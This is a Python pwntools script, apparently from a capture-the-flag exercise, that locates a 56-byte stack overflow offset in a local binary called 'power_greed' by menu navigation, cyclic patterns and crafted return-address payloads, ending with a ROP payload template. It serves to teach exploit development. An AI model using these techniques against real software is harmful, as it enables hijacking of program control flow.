#!/usr/bin/env python3
from pwn import *

# Manual offset verification - step by step demonstration
context.arch = 'amd64'
context.log_level = 'critical'

def test_offset(offset, description):
    """Test a specific offset and report results"""
    print(f"\n🔧 Testing {description}: {offset} bytes (0x{offset:x})")
    
    try:
        p = process('./power_greed')
        
        # Navigate to vulnerable function
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b': ', b'y')
        
        # Create test payload
        padding = b'A' * offset
        controlled_rip = b'BBBBBBBB'  # 8 bytes that should end up in RIP
        payload = padding + controlled_rip
        
        print(f"    Payload: {offset} A's + 8 B's = {len(payload)} bytes total")
        
        # Send payload
        p.sendlineafter(b'buffer: ', payload)
        p.wait()
        
        exit_code = p.poll()
        if exit_code == -11:  # SIGSEGV
            print(f"    ✅ CRASH! (SIGSEGV) - RIP likely controlled")
            return True
        else:
            print(f"    ❌ No crash (exit code: {exit_code})")
            return False
            
    except Exception as e:
        print(f"    ❌ Error: {e}")
        return False

def demonstrate_cyclic_method():
    """Demonstrate how cyclic patterns work for offset detection"""
    print("\n=== Cyclic Pattern Method Demonstration ===")
    
    # Generate a cyclic pattern
    pattern = cyclic(100)
    print(f"\n[+] Cyclic pattern (first 32 bytes): {pattern[:32]}")
    print(f"[+] Full pattern length: {len(pattern)} bytes")
    
    print("\n[+] How cyclic patterns work:")
    print("    - Each 4-byte sequence is unique: 'aaaa', 'baaa', 'caaa', etc.")
    print("    - When RIP crashes with a specific 4-byte value, we can find its position")
    print("    - That position tells us exactly how many bytes to reach RIP")
    
    # Show some examples
    for i in range(0, 64, 8):
        chunk = pattern[i:i+8]
        print(f"    Offset {i:2d}: {chunk}")
    
    print("\n[+] Let's crash with this pattern and see what happens...")
    
    try:
        p = process('./power_greed')
        
        # Navigate and crash
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b'> ', b'1')
        p.sendlineafter(b': ', b'y')
        p.sendlineafter(b'buffer: ', pattern)
        p.wait()
        
        print(f"    Process crashed with exit code: {p.poll()}")
        
        # The working PoC told us the offset is 56, so let's verify
        crash_bytes = pattern[56:64]
        print(f"    Bytes at offset 56: {crash_bytes}")
        print(f"    This should be what ends up in RIP!")
        
        # Find this pattern in our cyclic
        offset = cyclic_find(crash_bytes[:4])  # First 4 bytes
        print(f"    cyclic_find result: {offset}")
        
    except Exception as e:
        print(f"    Error: {e}")

def manual_search():
    """Manual binary search to find exact offset"""
    print("\n=== Manual Binary Search ===")
    
    # Test a range of offsets around our expected value
    test_offsets = [50, 52, 54, 55, 56, 57, 58, 60]
    
    for offset in test_offsets:
        result = test_offset(offset, f"manual test")
        if result:
            print(f"\n✅ Found working offset: {offset} bytes")

def verify_known_offset():
    """Verify the known offset of 56 bytes works"""
    print("\n=== Verifying Known Offset (56 bytes) ===")
    
    offset = 56
    
    # Test with different RIP values to confirm control
    test_rips = [
        0x4141414141414141,  # AAAAAAAA
        0x4242424242424242,  # BBBBBBBB  
        0x1337133713371337,  # Custom pattern
    ]
    
    for rip_val in test_rips:
        print(f"\n🔍 Testing RIP control with: {hex(rip_val)}")
        
        try:
            p = process('./power_greed')
            
            # Navigate
            p.sendlineafter(b'> ', b'1')
            p.sendlineafter(b'> ', b'1')
            p.sendlineafter(b': ', b'y')
            
            # Build payload
            payload = b'X' * offset + p64(rip_val)
            print(f"    Payload: {offset} X's + {hex(rip_val)} = {len(payload)} bytes")
            
            # Send
            p.sendlineafter(b'buffer: ', payload)
            p.wait()
            
            if p.poll() == -11:
                print(f"    ✅ Crashed as expected with controlled RIP")
            else:
                print(f"    ❌ Unexpected result")
                
        except Exception as e:
            print(f"    ❌ Error: {e}")

def main():
    print("=== Manual Offset Detection & Verification ===")
    print("[+] This script demonstrates how to find the exact offset manually")
    
    # Method 1: Demonstrate cyclic patterns
    demonstrate_cyclic_method()
    
    # Method 2: Manual search 
    manual_search()
    
    # Method 3: Verify known offset
    verify_known_offset()
    
    print("\n=== Summary ===")
    print("✅ The offset to RIP is 56 bytes (0x38)")
    print("💡 This means:")
    print("   - First 56 bytes fill the buffer and stack space")
    print("   - Bytes 57-64 overwrite the saved return address (RIP)")
    print("   - We have full control over where the program jumps!")
    print("")
    print("🔧 Usage in exploits:")
    print("   padding = b'A' * 56")
    print("   payload = padding + p64(rop_gadget_address)")

if __name__ == '__main__':
    main()

